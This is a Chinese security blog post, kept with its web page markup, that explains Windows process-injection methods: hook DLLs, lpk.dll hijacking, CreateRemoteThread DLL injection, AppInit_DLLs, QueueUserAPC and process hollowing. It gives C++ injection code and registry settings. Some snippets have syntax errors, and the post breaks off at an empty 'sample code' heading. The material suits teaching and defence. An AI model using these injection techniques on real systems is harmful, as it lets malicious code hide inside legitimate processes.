<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows 进程注入 | 安全代码</title><meta name="author" content="henices"><meta name="copyright" content="henices"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. Process Injection 方法总结  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较多，这里介绍常见的一些方法，以及相应的检查手段。 1.1 SetWindowsHookEx SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。往Windows的hook chain中安装hook 例程，监控系统某种">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows 进程注入">
<meta property="og:url" content="https://usmacd.com/cn/process_injection/index.html">
<meta property="og:site_name" content="安全代码">
<meta property="og:description" content="1. Process Injection 方法总结  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较多，这里介绍常见的一些方法，以及相应的检查手段。 1.1 SetWindowsHookEx SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。往Windows的hook chain中安装hook 例程，监控系统某种">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640">
<meta property="article:published_time" content="2023-09-06T03:00:51.765Z">
<meta property="article:modified_time" content="2023-09-06T03:00:51.765Z">
<meta property="article:author" content="henices">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="windows">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Windows 进程注入",
  "url": "https://usmacd.com/cn/process_injection/",
  "image": "https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640",
  "datePublished": "2023-09-06T03:00:51.765Z",
  "dateModified": "2023-09-06T03:00:51.765Z",
  "author": [
    {
      "@type": "Person",
      "name": "henices",
      "url": "https://usmacd.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://usmacd.com/cn/process_injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows 进程注入',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.1.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">166</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">安全代码</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows 进程注入</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/thoughts"><i class="fa-fw fas fa-cloud"></i><span> 想法</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><span> sitemap</span></a></div><div class="menus_item"><a class="site-page" href="/random.html"><span> random</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Windows 进程注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-06T03:00:51.765Z" title="发表于 2023-09-06 11:00:51">2023-09-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-06T03:00:51.765Z" title="更新于 2023-09-06 11:00:51">2023-09-06</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p>
<h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK WINAPI <span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_  <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">  _In_  HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">  _In_  HINSTANCE hMod,</span></span><br><span class="line"><span class="params">  _In_  DWORD dwThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>dwThread 为0，将监管系统中所有线程。</li>
<li>idHook        指定监控event的类型</li>
<li>hMod          dll句柄</li>
<li>lpfn          hook例程的指针</li>
</ul>
<p>MSDN给出了一个使用的例子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOOKPROC hkprcSysMsg;</span><br><span class="line"><span class="type">static</span> HINSTANCE hinstDLL; </span><br><span class="line"><span class="type">static</span> HHOOK hhookSysMsg; </span><br><span class="line"> </span><br><span class="line">hinstDLL = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); </span><br><span class="line">hkprcSysMsg = (HOOKPROC)<span class="built_in">GetProcAddress</span>(hinstDLL, <span class="string">&quot;SysMessageProc&quot;</span>); </span><br><span class="line"></span><br><span class="line">hhookSysMsg = <span class="built_in">SetWindowsHookEx</span>( </span><br><span class="line">                    WH_SYSMSGFILTER,</span><br><span class="line">                    hkprcSysMsg,</span><br><span class="line">                    hinstDLL,</span><br><span class="line">                    <span class="number">0</span>); </span><br></pre></td></tr></table></figure>

<p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p>
<h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p>
<p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p>
<p>  这里有二个问题，值得思考。</p>
<h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p>
<p> <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. The directory from which the application loaded.</span><br><span class="line">b. The current directory.</span><br><span class="line">c. The system directory. Use the GetSystemDirectory function to get the path of this directory.</span><br><span class="line">d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</span><br><span class="line">e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</span><br><span class="line">f. The directories that are listed in the PATH environment variable. Note that</span><br><span class="line">   this does not include the per-application path specified by the App</span><br><span class="line">   Paths registry key. The App Paths key is not used when computing the DLL</span><br><span class="line">   search path.</span><br></pre></td></tr></table></figure>
<p>因此把lpk.dll放到运行的程序同一目录即可。</p>
<h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]</span><br><span class="line">&quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00</span><br></pre></td></tr></table></figure>


<h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_  LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>hProcess        要注入的进程的句柄</li>
<li>lpStartAddress  远程进程中执行的函数的地址（指针）</li>
<li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li>
</ul>
<h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p>
<p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p>
<p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p>
<p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get address of the LoadLibrary function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID addr = (LPVOID)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Allocate new memory region inside the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID arg = (LPVOID)<span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="built_in">strlen</span>(buffer), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Inject our DLL into the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE threadID = <span class="built_in">CreateRemoteThread</span>(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (threadID == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the remote thread could not be created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(process);</span><br></pre></td></tr></table></figure>

<p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p>
<p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p>
<h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p>
<ol>
<li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li>
<li>RtlCreateUserThread</li>
</ol>
<h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p>
<p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p>
<p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p>
<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p>
<ul>
<li>REG_DWORD 1 表示全局开启</li>
<li>REG_DWORD 0 表示全局关闭</li>
</ul>
<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p>
<ul>
<li>REG_DWORD 0 加载任意DLL</li>
<li>REG_DWORD 1 只加载签名的DLL</li>
</ul>
<h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p>
<p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    &#x2F;&#x2F; APC function<br>  <em>In</em>  HANDLE hThread,     &#x2F;&#x2F; handle of thread<br>  <em>In</em>  ULONG_PTR dwData    &#x2F;&#x2F; APc function parameter<br>);</p>
<p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p>
<p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p>
<p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p>
<p>核心伪代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD ret;</span><br><span class="line"><span class="type">char</span> *DllName = <span class="string">&#x27;c:\\MyDll.dll&#x27;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">PVOID param = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;</span><br><span class="line">  <span class="keyword">for</span> (DWORD p = <span class="number">0</span>; p &lt; NumberOfThreads; p ++) &#123;</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, ThreadId[p]);</span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InjectDll</span><span class="params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&#x27;kernel32.dll&#x27;</span>, <span class="string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p>
<p>基本步骤如下：</p>
<ol>
<li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li>
<li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li>
<li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li>
<li>使用WriteProcessMemory在分配区域内写入恶意代码</li>
<li>使用SetThreadContext设置线程内容为指定的恶意代码</li>
<li>使用ResumeThread回复进程执行</li>
</ol>
<p>代码中用到PEB的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dt nt!_PEB</span><br><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged : UChar</span><br><span class="line">+0x003 SpareBool : UChar</span><br><span class="line">+0x004 Mutant : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br></pre></td></tr></table></figure>
<p>示例代码：</p>
